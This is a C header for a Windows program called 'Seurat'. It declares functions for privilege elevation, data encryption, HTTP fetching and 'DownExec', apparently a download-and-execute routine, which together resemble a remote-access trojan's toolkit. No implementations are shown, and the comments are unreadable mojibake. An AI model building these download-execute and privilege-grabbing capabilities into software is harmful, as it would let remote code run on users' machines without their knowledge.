#ifndef _SEURAT_FUNCTIONS_H__
#define _SEURAT_FUNCTIONS_H__

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

typedef struct _INTERNET_CACHE_ENTRY_INFOA {
    DWORD dwStructSize;         // version of cache system.
    LPSTR lpszSourceUrlName;    // embedded pointer to the URL name string.
    LPSTR   lpszLocalFileName;  // embedded pointer to the local file name.
    DWORD CacheEntryType;       // cache type bit mask.
    DWORD dwUseCount;           // current users count of the cache entry.
    DWORD dwHitRate;            // num of times the cache entry was retrieved.
    DWORD dwSizeLow;            // low DWORD of the file size.
    DWORD dwSizeHigh;           // high DWORD of the file size.
    FILETIME LastModifiedTime;  // last modified time of the file in GMT format.
    FILETIME ExpireTime;        // expire time of the file in GMT format
    FILETIME LastAccessTime;    // last accessed time in GMT format
    FILETIME LastSyncTime;      // last time the URL was synchronized
                                // with the source
    LPBYTE lpHeaderInfo;        // embedded pointer to the header info.
    DWORD dwHeaderInfoSize;     // size of the above header.
    LPSTR   lpszFileExtension;  // File extension used to retrive the urldata as a file.
        union {                     // Exemption delta from last access time.
                DWORD dwReserved;
                DWORD dwExemptDelta;
    };                          // Exemption delta from last access
} INTERNET_CACHE_ENTRY_INFO, * LPINTERNET_CACHE_ENTRY_INFO;

//���ܽ��ܺ���
void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key);  
void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key);

//Ȩ������
BOOL WINAPI SetPrivilege(LPCTSTR lpszPrivilege);

//��ȡ��ҳ����
char* GetHttpFile(char Url[]);

//������
void DownExec(char url[]);
//����ҳ
void OpenUrl(char url[]);

BOOL OpenUserDesktop();
int GrantPrivilege();

#endif //_SEURAT_FUNCTIONS_H__

